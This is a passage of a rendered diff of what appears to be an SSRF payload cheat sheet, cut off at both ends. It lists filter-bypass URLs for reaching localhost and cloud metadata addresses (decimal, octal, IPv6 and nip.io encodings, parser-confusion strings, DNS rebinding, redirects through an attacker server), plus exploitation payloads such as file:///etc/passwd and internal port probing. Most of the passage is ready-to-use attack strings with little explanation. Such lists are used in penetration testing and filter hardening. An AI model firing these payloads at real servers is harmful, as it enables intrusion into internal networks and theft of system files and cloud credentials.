+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">0000</span>::<span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">3128</span>/ Squid
+</span></span></code></pre></div><h3 id="bypass-localhost-with-a-domain-redirection">
+  Bypass localhost with a domain redirection
+  <a class="anchor" href="#bypass-localhost-with-a-domain-redirection">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//spoofed.burpcollaborator.net
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//localtest.me
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//customer1.app.localhost.my.company.127.0.0.1.nip.io
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//mail.ebc.apple.com redirect to <span style="color:#ae81ff">127.0</span>.0.6 == localhost
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//bugbounty.dod.network redirect to <span style="color:#ae81ff">127.0</span>.0.2 == localhost
+</span></span></code></pre></div><p>The service nip.io is awesome for that, it will convert any ip address as a dns.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>NIP.IO maps &lt;anything&gt;.&lt;IP Address&gt;.nip.io to the corresponding &lt;IP Address&gt;, even <span style="color:#ae81ff">127.0</span>.0.1.nip.io maps to <span style="color:#ae81ff">127.0</span>.0.1
+</span></span></code></pre></div><h3 id="bypass-localhost-with-cidr">
+  Bypass localhost with CIDR
+  <a class="anchor" href="#bypass-localhost-with-cidr">#</a>
+</h3>
+<p>It&rsquo;s a /8</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">127.127</span>.127.127
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">127.0</span>.1.3
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">127.0</span>.0.0
+</span></span></code></pre></div><h3 id="bypass-using-a-decimal-ip-location">
+  Bypass using a decimal IP location
+  <a class="anchor" href="#bypass-using-a-decimal-ip-location">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">2130706433</span>/ = http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">127.0</span>.0.1
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">3232235521</span>/ = http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">192.168</span>.0.1
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">3232235777</span>/ = http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">192.168</span>.1.1
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">2852039166</span>/  = http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">169.254</span>.169.254
+</span></span></code></pre></div><h3 id="bypass-using-octal-ip">
+  Bypass using octal IP
+  <a class="anchor" href="#bypass-using-octal-ip">#</a>
+</h3>
+<p>Implementations differ on how to handle octal format of ipv4.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>http://0177.0.0.1/ <span style="color:#f92672">=</span> http://127.0.0.1
+</span></span><span style="display:flex;"><span>http://o177.0.0.1/ <span style="color:#f92672">=</span> http://127.0.0.1
+</span></span><span style="display:flex;"><span>http://0o177.0.0.1/ <span style="color:#f92672">=</span> http://127.0.0.1
+</span></span><span style="display:flex;"><span>http://q177.0.0.1/ <span style="color:#f92672">=</span> http://127.0.0.1
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>Ref:</p>
+<ul>
+<li>
+  <a href="https://www.youtube.com/watch?v=_o1RPJAe4kU">DEFCON 29-KellyKaoudis SickCodes-Rotten code, aging standards &amp; pwning IPv4 parsing</a></li>
+<li>
+  <a href="https://www.agarri.fr/docs/AppSecEU15-Server_side_browsing_considered_harmful.pdf">AppSecEU15-Server_side_browsing_considered_harmful.pdf</a></li>
+</ul>
+<h3 id="bypass-using-ipv6ipv4-address-embedding">
+  Bypass using IPv6/IPv4 Address Embedding
+  <a class="anchor" href="#bypass-using-ipv6ipv4-address-embedding">#</a>
+</h3>
+<p>
+  <a href="http://www.tcpipguide.com/free/t_IPv6IPv4AddressEmbedding.htm">IPv6/IPv4 Address Embedding</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//[<span style="color:#ae81ff">0</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">0</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">0</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">0</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">0</span><span style="color:#960050;background-color:#1e0010">:</span>ffff<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">127.0</span>.0.<span style="color:#ae81ff">1</span>]
+</span></span></code></pre></div><h3 id="bypass-using-malformed-urls">
+  Bypass using malformed urls
+  <a class="anchor" href="#bypass-using-malformed-urls">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>localhost<span style="color:#960050;background-color:#1e0010">:</span>+11211aaa
+</span></span><span style="display:flex;"><span>localhost<span style="color:#960050;background-color:#1e0010">:</span>00011211aaaa
+</span></span></code></pre></div><h3 id="bypass-using-rare-address">
+  Bypass using rare address
+  <a class="anchor" href="#bypass-using-rare-address">#</a>
+</h3>
+<p>You can short-hand IP addresses by dropping the zeros</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">0</span>/
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">127.1</span>
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">127.0</span>.1
+</span></span></code></pre></div><h3 id="bypass-using-url-encoding">
+  Bypass using URL encoding
+  <a class="anchor" href="#bypass-using-url-encoding">#</a>
+</h3>
+<p>
+  <a href="https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter">Single or double encode a specific URL to bypass blacklist</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">127.0</span>.0.<span style="color:#ae81ff">1</span>/<span style="color:#66d9ef">%</span>61dmin
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">127.0</span>.0.<span style="color:#ae81ff">1</span>/<span style="color:#66d9ef">%</span>2561dmin
+</span></span></code></pre></div><h3 id="bypass-using-bash-variables">
+  Bypass using bash variables
+  <a class="anchor" href="#bypass-using-bash-variables">#</a>
+</h3>
+<p>(curl only)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>curl -v <span style="color:#e6db74">&#34;http://evil</span>$google<span style="color:#e6db74">.com&#34;</span>
+</span></span><span style="display:flex;"><span>$google = <span style="color:#e6db74">&#34;&#34;</span>
+</span></span></code></pre></div><h3 id="bypass-using-tricks-combination">
+  Bypass using tricks combination
+  <a class="anchor" href="#bypass-using-tricks-combination">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">1.1</span>.1.1 &amp;@2.2.2.<span style="color:#ae81ff">2</span><span style="color:#75715e"># @3.3.3.3/</span>
+</span></span><span style="display:flex;"><span>urllib2 <span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">1.1</span>.1.1
+</span></span><span style="display:flex;"><span>requests + browsers <span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">2.2</span>.2.2
+</span></span><span style="display:flex;"><span>urllib <span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">3.3</span>.3.3
+</span></span></code></pre></div><h3 id="bypass-using-enclosed-alphanumerics">
+  Bypass using enclosed alphanumerics
+  <a class="anchor" href="#bypass-using-enclosed-alphanumerics">#</a>
+</h3>
+<p>
+  <a href="https://twitter.com/EdOverflow">@EdOverflow</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#960050;background-color:#1e0010">ⓔⓧⓐⓜⓟⓛⓔ</span>.<span style="color:#960050;background-color:#1e0010">ⓒⓞⓜ</span> = example.com
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>List<span style="color:#960050;background-color:#1e0010">:</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">①</span> <span style="color:#960050;background-color:#1e0010">②</span> <span style="color:#960050;background-color:#1e0010">③</span> <span style="color:#960050;background-color:#1e0010">④</span> <span style="color:#960050;background-color:#1e0010">⑤</span> <span style="color:#960050;background-color:#1e0010">⑥</span> <span style="color:#960050;background-color:#1e0010">⑦</span> <span style="color:#960050;background-color:#1e0010">⑧</span> <span style="color:#960050;background-color:#1e0010">⑨</span> <span style="color:#960050;background-color:#1e0010">⑩</span> <span style="color:#960050;background-color:#1e0010">⑪</span> <span style="color:#960050;background-color:#1e0010">⑫</span> <span style="color:#960050;background-color:#1e0010">⑬</span> <span style="color:#960050;background-color:#1e0010">⑭</span> <span style="color:#960050;background-color:#1e0010">⑮</span> <span style="color:#960050;background-color:#1e0010">⑯</span> <span style="color:#960050;background-color:#1e0010">⑰</span> <span style="color:#960050;background-color:#1e0010">⑱</span> <span style="color:#960050;background-color:#1e0010">⑲</span> <span style="color:#960050;background-color:#1e0010">⑳</span> <span style="color:#960050;background-color:#1e0010">⑴</span> <span style="color:#960050;background-color:#1e0010">⑵</span> <span style="color:#960050;background-color:#1e0010">⑶</span> <span style="color:#960050;background-color:#1e0010">⑷</span> <span style="color:#960050;background-color:#1e0010">⑸</span> <span style="color:#960050;background-color:#1e0010">⑹</span> <span style="color:#960050;background-color:#1e0010">⑺</span> <span style="color:#960050;background-color:#1e0010">⑻</span> <span style="color:#960050;background-color:#1e0010">⑼</span> <span style="color:#960050;background-color:#1e0010">⑽</span> <span style="color:#960050;background-color:#1e0010">⑾</span> <span style="color:#960050;background-color:#1e0010">⑿</span> <span style="color:#960050;background-color:#1e0010">⒀</span> <span style="color:#960050;background-color:#1e0010">⒁</span> <span style="color:#960050;background-color:#1e0010">⒂</span> <span style="color:#960050;background-color:#1e0010">⒃</span> <span style="color:#960050;background-color:#1e0010">⒄</span> <span style="color:#960050;background-color:#1e0010">⒅</span> <span style="color:#960050;background-color:#1e0010">⒆</span> <span style="color:#960050;background-color:#1e0010">⒇</span> <span style="color:#960050;background-color:#1e0010">⒈</span> <span style="color:#960050;background-color:#1e0010">⒉</span> <span style="color:#960050;background-color:#1e0010">⒊</span> <span style="color:#960050;background-color:#1e0010">⒋</span> <span style="color:#960050;background-color:#1e0010">⒌</span> <span style="color:#960050;background-color:#1e0010">⒍</span> <span style="color:#960050;background-color:#1e0010">⒎</span> <span style="color:#960050;background-color:#1e0010">⒏</span> <span style="color:#960050;background-color:#1e0010">⒐</span> <span style="color:#960050;background-color:#1e0010">⒑</span> <span style="color:#960050;background-color:#1e0010">⒒</span> <span style="color:#960050;background-color:#1e0010">⒓</span> <span style="color:#960050;background-color:#1e0010">⒔</span> <span style="color:#960050;background-color:#1e0010">⒕</span> <span style="color:#960050;background-color:#1e0010">⒖</span> <span style="color:#960050;background-color:#1e0010">⒗</span> <span style="color:#960050;background-color:#1e0010">⒘</span> <span style="color:#960050;background-color:#1e0010">⒙</span> <span style="color:#960050;background-color:#1e0010">⒚</span> <span style="color:#960050;background-color:#1e0010">⒛</span> <span style="color:#960050;background-color:#1e0010">⒜</span> <span style="color:#960050;background-color:#1e0010">⒝</span> <span style="color:#960050;background-color:#1e0010">⒞</span> <span style="color:#960050;background-color:#1e0010">⒟</span> <span style="color:#960050;background-color:#1e0010">⒠</span> <span style="color:#960050;background-color:#1e0010">⒡</span> <span style="color:#960050;background-color:#1e0010">⒢</span> <span style="color:#960050;background-color:#1e0010">⒣</span> <span style="color:#960050;background-color:#1e0010">⒤</span> <span style="color:#960050;background-color:#1e0010">⒥</span> <span style="color:#960050;background-color:#1e0010">⒦</span> <span style="color:#960050;background-color:#1e0010">⒧</span> <span style="color:#960050;background-color:#1e0010">⒨</span> <span style="color:#960050;background-color:#1e0010">⒩</span> <span style="color:#960050;background-color:#1e0010">⒪</span> <span style="color:#960050;background-color:#1e0010">⒫</span> <span style="color:#960050;background-color:#1e0010">⒬</span> <span style="color:#960050;background-color:#1e0010">⒭</span> <span style="color:#960050;background-color:#1e0010">⒮</span> <span style="color:#960050;background-color:#1e0010">⒯</span> <span style="color:#960050;background-color:#1e0010">⒰</span> <span style="color:#960050;background-color:#1e0010">⒱</span> <span style="color:#960050;background-color:#1e0010">⒲</span> <span style="color:#960050;background-color:#1e0010">⒳</span> <span style="color:#960050;background-color:#1e0010">⒴</span> <span style="color:#960050;background-color:#1e0010">⒵</span> <span style="color:#960050;background-color:#1e0010">Ⓐ</span> <span style="color:#960050;background-color:#1e0010">Ⓑ</span> <span style="color:#960050;background-color:#1e0010">Ⓒ</span> <span style="color:#960050;background-color:#1e0010">Ⓓ</span> <span style="color:#960050;background-color:#1e0010">Ⓔ</span> <span style="color:#960050;background-color:#1e0010">Ⓕ</span> <span style="color:#960050;background-color:#1e0010">Ⓖ</span> <span style="color:#960050;background-color:#1e0010">Ⓗ</span> <span style="color:#960050;background-color:#1e0010">Ⓘ</span> <span style="color:#960050;background-color:#1e0010">Ⓙ</span> <span style="color:#960050;background-color:#1e0010">Ⓚ</span> <span style="color:#960050;background-color:#1e0010">Ⓛ</span> <span style="color:#960050;background-color:#1e0010">Ⓜ</span> <span style="color:#960050;background-color:#1e0010">Ⓝ</span> <span style="color:#960050;background-color:#1e0010">Ⓞ</span> <span style="color:#960050;background-color:#1e0010">Ⓟ</span> <span style="color:#960050;background-color:#1e0010">Ⓠ</span> <span style="color:#960050;background-color:#1e0010">Ⓡ</span> <span style="color:#960050;background-color:#1e0010">Ⓢ</span> <span style="color:#960050;background-color:#1e0010">Ⓣ</span> <span style="color:#960050;background-color:#1e0010">Ⓤ</span> <span style="color:#960050;background-color:#1e0010">Ⓥ</span> <span style="color:#960050;background-color:#1e0010">Ⓦ</span> <span style="color:#960050;background-color:#1e0010">Ⓧ</span> <span style="color:#960050;background-color:#1e0010">Ⓨ</span> <span style="color:#960050;background-color:#1e0010">Ⓩ</span> <span style="color:#960050;background-color:#1e0010">ⓐ</span> <span style="color:#960050;background-color:#1e0010">ⓑ</span> <span style="color:#960050;background-color:#1e0010">ⓒ</span> <span style="color:#960050;background-color:#1e0010">ⓓ</span> <span style="color:#960050;background-color:#1e0010">ⓔ</span> <span style="color:#960050;background-color:#1e0010">ⓕ</span> <span style="color:#960050;background-color:#1e0010">ⓖ</span> <span style="color:#960050;background-color:#1e0010">ⓗ</span> <span style="color:#960050;background-color:#1e0010">ⓘ</span> <span style="color:#960050;background-color:#1e0010">ⓙ</span> <span style="color:#960050;background-color:#1e0010">ⓚ</span> <span style="color:#960050;background-color:#1e0010">ⓛ</span> <span style="color:#960050;background-color:#1e0010">ⓜ</span> <span style="color:#960050;background-color:#1e0010">ⓝ</span> <span style="color:#960050;background-color:#1e0010">ⓞ</span> <span style="color:#960050;background-color:#1e0010">ⓟ</span> <span style="color:#960050;background-color:#1e0010">ⓠ</span> <span style="color:#960050;background-color:#1e0010">ⓡ</span> <span style="color:#960050;background-color:#1e0010">ⓢ</span> <span style="color:#960050;background-color:#1e0010">ⓣ</span> <span style="color:#960050;background-color:#1e0010">ⓤ</span> <span style="color:#960050;background-color:#1e0010">ⓥ</span> <span style="color:#960050;background-color:#1e0010">ⓦ</span> <span style="color:#960050;background-color:#1e0010">ⓧ</span> <span style="color:#960050;background-color:#1e0010">ⓨ</span> <span style="color:#960050;background-color:#1e0010">ⓩ</span> <span style="color:#960050;background-color:#1e0010">⓪</span> <span style="color:#960050;background-color:#1e0010">⓫</span> <span style="color:#960050;background-color:#1e0010">⓬</span> <span style="color:#960050;background-color:#1e0010">⓭</span> <span style="color:#960050;background-color:#1e0010">⓮</span> <span style="color:#960050;background-color:#1e0010">⓯</span> <span style="color:#960050;background-color:#1e0010">⓰</span> <span style="color:#960050;background-color:#1e0010">⓱</span> <span style="color:#960050;background-color:#1e0010">⓲</span> <span style="color:#960050;background-color:#1e0010">⓳</span> <span style="color:#960050;background-color:#1e0010">⓴</span> <span style="color:#960050;background-color:#1e0010">⓵</span> <span style="color:#960050;background-color:#1e0010">⓶</span> <span style="color:#960050;background-color:#1e0010">⓷</span> <span style="color:#960050;background-color:#1e0010">⓸</span> <span style="color:#960050;background-color:#1e0010">⓹</span> <span style="color:#960050;background-color:#1e0010">⓺</span> <span style="color:#960050;background-color:#1e0010">⓻</span> <span style="color:#960050;background-color:#1e0010">⓼</span> <span style="color:#960050;background-color:#1e0010">⓽</span> <span style="color:#960050;background-color:#1e0010">⓾</span> <span style="color:#960050;background-color:#1e0010">⓿</span>
+</span></span></code></pre></div><h3 id="bypass-using-unicode">
+  Bypass using unicode
+  <a class="anchor" href="#bypass-using-unicode">#</a>
+</h3>
+<p>In some languages (.NET, Python 3) regex supports unicode by default.
+<code>\d</code> includes <code>0123456789</code> but also <code>๐๑๒๓๔๕๖๗๘๙</code>.</p>
+<h3 id="bypass-filter_var-php-function">
+  Bypass filter_var() php function
+  <a class="anchor" href="#bypass-filter_var-php-function">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#ae81ff">0</span><span style="color:#960050;background-color:#1e0010">:</span>//evil.com<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">80</span>;http<span style="color:#960050;background-color:#1e0010">:</span>//google.com<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">80</span>/ 
+</span></span></code></pre></div><h3 id="bypass-against-a-weak-parser">
+  Bypass against a weak parser
+  <a class="anchor" href="#bypass-against-a-weak-parser">#</a>
+</h3>
+<p>by Orange Tsai (
+  <a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf">Blackhat A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf</a>)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">127.1</span>.1.<span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">80</span>\@127.2.2.<span style="color:#ae81ff">2</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">80</span>/
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">127.1</span>.1.<span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">80</span>\@@127.2.2.<span style="color:#ae81ff">2</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">80</span>/
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">127.1</span>.1.<span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">80</span><span style="color:#960050;background-color:#1e0010">:</span>\@@127.2.2.<span style="color:#ae81ff">2</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">80</span>/
+</span></span><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">127.1</span>.1.<span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">80</span><span style="color:#75715e">#\@127.2.2.2:80/</span>
+</span></span></code></pre></div><p>
+  <img src="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/Images/WeakParser.jpg?raw=true" alt="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/Images/WeakParser.png?raw=true" /></p>
+<h3 id="bypassing-using-a-redirect">
+  Bypassing using a redirect
+  <a class="anchor" href="#bypassing-using-a-redirect">#</a>
+</h3>
+<p>
+  <a href="https://portswigger.net/web-security/ssrf#bypassing-ssrf-filters-via-open-redirection">using a redirect</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#ae81ff">1</span>. Create a page on a whitelisted host that redirects requests to the SSRF the target URL (e.g. <span style="color:#ae81ff">192.168</span>.0.<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span>. Launch the SSRF pointing to  vulnerable.com/index.php<span style="color:#66d9ef">?</span>url=http<span style="color:#960050;background-color:#1e0010">:</span>//YOUR_SERVER_IP
+</span></span><span style="display:flex;"><span>vulnerable.com will fetch YOUR_SERVER_IP which will redirect to <span style="color:#ae81ff">192.168</span>.0.1
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3</span>. You can use response codes [<span style="color:#ae81ff">307</span>](https<span style="color:#960050;background-color:#1e0010">:</span>//developer.mozilla.org/en-US/docs/Web/HTTP/Status/<span style="color:#ae81ff">307</span>) and [<span style="color:#ae81ff">308</span>](https<span style="color:#960050;background-color:#1e0010">:</span>//developer.mozilla.org/en-US/docs/Web/HTTP/Status/<span style="color:#ae81ff">308</span>) <span style="color:#66d9ef">in</span> order to retain HTTP method and body after the redirection.
+</span></span></code></pre></div><h3 id="bypassing-using-typeurl">
+  Bypassing using type=url
+  <a class="anchor" href="#bypassing-using-typeurl">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Change <span style="color:#e6db74">&#34;type=file&#34;</span> to <span style="color:#e6db74">&#34;type=url&#34;</span>
+</span></span><span style="display:flex;"><span>Paste URL <span style="color:#66d9ef">in</span> text field and hit enter
+</span></span><span style="display:flex;"><span>Using this vulnerability users can upload images from any image URL = trigger an SSRF
+</span></span></code></pre></div><h3 id="bypassing-using-dns-rebinding-toctou">
+  Bypassing using DNS Rebinding (TOCTOU)
+  <a class="anchor" href="#bypassing-using-dns-rebinding-toctou">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Create a domain that change between two IPs. http<span style="color:#960050;background-color:#1e0010">:</span>//1u.ms/ exists <span style="color:#66d9ef">for</span> this purpose.
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">For</span> example to rotate between <span style="color:#ae81ff">1.2</span>.3.4 and <span style="color:#ae81ff">169.254</span>-<span style="color:#ae81ff">169.254</span>, use the following domain<span style="color:#960050;background-color:#1e0010">:</span>
+</span></span><span style="display:flex;"><span>make-<span style="color:#ae81ff">1.2</span>.3.<span style="color:#ae81ff">4</span>-rebind-<span style="color:#ae81ff">169.254</span>-<span style="color:#ae81ff">169.254</span>-rr.1u.ms
+</span></span></code></pre></div><h3 id="bypassing-using-jar-protocol-java-only">
+  Bypassing using jar protocol (java only)
+  <a class="anchor" href="#bypassing-using-jar-protocol-java-only">#</a>
+</h3>
+<p>Blind SSRF</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>jar<span style="color:#960050;background-color:#1e0010">:</span>scheme<span style="color:#960050;background-color:#1e0010">:</span>//domain/path!/ 
+</span></span><span style="display:flex;"><span>jar<span style="color:#960050;background-color:#1e0010">:</span>http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">127.0</span>.0.<span style="color:#ae81ff">1</span>!/
+</span></span><span style="display:flex;"><span>jar<span style="color:#960050;background-color:#1e0010">:</span>https<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">127.0</span>.0.<span style="color:#ae81ff">1</span>!/
+</span></span><span style="display:flex;"><span>jar<span style="color:#960050;background-color:#1e0010">:</span>ftp<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">127.0</span>.0.<span style="color:#ae81ff">1</span>!/
+</span></span></code></pre></div><h2 id="ssrf-exploitation-via-url-scheme">
+  SSRF exploitation via URL Scheme
+  <a class="anchor" href="#ssrf-exploitation-via-url-scheme">#</a>
+</h2>
+<h3 id="file">
+  File
+  <a class="anchor" href="#file">#</a>
+</h3>
+<p>Allows an attacker to fetch the content of a file on the server</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>file<span style="color:#960050;background-color:#1e0010">:</span>//path/to/file
+</span></span><span style="display:flex;"><span>file<span style="color:#960050;background-color:#1e0010">:</span>///etc/passwd
+</span></span><span style="display:flex;"><span>file<span style="color:#960050;background-color:#1e0010">:</span>//\/\/etc/passwd
+</span></span><span style="display:flex;"><span>ssrf.php<span style="color:#66d9ef">?</span>url=file<span style="color:#960050;background-color:#1e0010">:</span>///etc/passwd
+</span></span></code></pre></div><h3 id="http">
+  HTTP
+  <a class="anchor" href="#http">#</a>
+</h3>
+<p>Allows an attacker to fetch any content from the web, it can also be used to scan ports.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>ssrf.php<span style="color:#66d9ef">?</span>url=http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">127.0</span>.0.<span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">22</span>
+</span></span><span style="display:flex;"><span>ssrf.php<span style="color:#66d9ef">?</span>url=http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">127.0</span>.0.<span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">80</span>
+</span></span><span style="display:flex;"><span>ssrf.php<span style="color:#66d9ef">?</span>url=http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">127.0</span>.0.<span style="color:#ae81ff">1</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">443</span>
+</span></span></code></pre></div><p>
+  <img src="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/Images/SSRF_stream.png?raw=true" alt="SSRF stream" /></p>
+<p>The following URL scheme can be used to probe the network</p>
+<h3 id="dict">
+  Dict
+  <a class="anchor" href="#dict">#</a>
+</h3>
+<p>The DICT URL scheme is used to refer to definitions or word lists available using the DICT protocol:</p>
